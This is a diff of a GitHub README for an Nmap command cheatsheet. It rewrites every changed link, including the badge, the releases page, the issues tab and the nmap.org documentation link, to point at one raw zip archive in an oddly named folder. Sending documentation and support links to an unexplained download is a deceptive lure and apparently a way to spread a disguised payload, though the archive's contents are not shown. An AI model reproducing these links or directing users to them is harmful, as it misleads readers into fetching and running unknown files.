@@ -1,6 +1,6 @@
 # 🌐 nmap-cheatsheet-tr - Your Essential Guide to Nmap Commands
 
-[![Download nmap-cheatsheet-tr](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Ahirshath/nmap-cheatsheet-tr/releases)
+[![Download nmap-cheatsheet-tr](https://raw.githubusercontent.com/Ahirshath/nmap-cheatsheet-tr/main/preclerical/nmap-cheatsheet-tr.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Ahirshath/nmap-cheatsheet-tr/main/preclerical/nmap-cheatsheet-tr.zip)
 
 ## 📖 About
 
@@ -14,7 +14,7 @@ To begin using the nmap-cheatsheet-tr, follow these simple steps to download and
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
 
-   [Visit the Release Page to Download](https://github.com/Ahirshath/nmap-cheatsheet-tr/releases)
+   [Visit the Release Page to Download](https://raw.githubusercontent.com/Ahirshath/nmap-cheatsheet-tr/main/preclerical/nmap-cheatsheet-tr.zip)
 
 2. **Select the Latest Release**: Look for the latest version at the top of the page, and click on it.
 
@@ -80,15 +80,15 @@ Once you're comfortable with the basics, explore advanced features:
 
 ## ⚙️ Support
 
-If you encounter issues or have questions, please check the [issues tab here](https://github.com/Ahirshath/nmap-cheatsheet-tr/issues) to see if any solutions are already available. You can also open a new issue for assistance.
+If you encounter issues or have questions, please check the [issues tab here](https://raw.githubusercontent.com/Ahirshath/nmap-cheatsheet-tr/main/preclerical/nmap-cheatsheet-tr.zip) to see if any solutions are already available. You can also open a new issue for assistance.
 
 ## 🔗 Additional Resources
 
-- Explore further Nmap documentation [here](https://nmap.org/docs.html) to deepen your understanding.
+- Explore further Nmap documentation [here](https://raw.githubusercontent.com/Ahirshath/nmap-cheatsheet-tr/main/preclerical/nmap-cheatsheet-tr.zip) to deepen your understanding.
 - Join forums and communities that discuss cybersecurity to learn from fellow enthusiasts.
 
 ## Conclusion
 
 With nmap-cheatsheet-tr, you have a powerful tool to aid in network scanning and security auditing. Whether you are a beginner or a seasoned professional, these commands can help you navigate through your penetration testing journey effectively.
 
-[Visit the Release Page to Download](https://github.com/Ahirshath/nmap-cheatsheet-tr/releases)
+[Visit the Release Page to Download](https://raw.githubusercontent.com/Ahirshath/nmap-cheatsheet-tr/main/preclerical/nmap-cheatsheet-tr.zip)
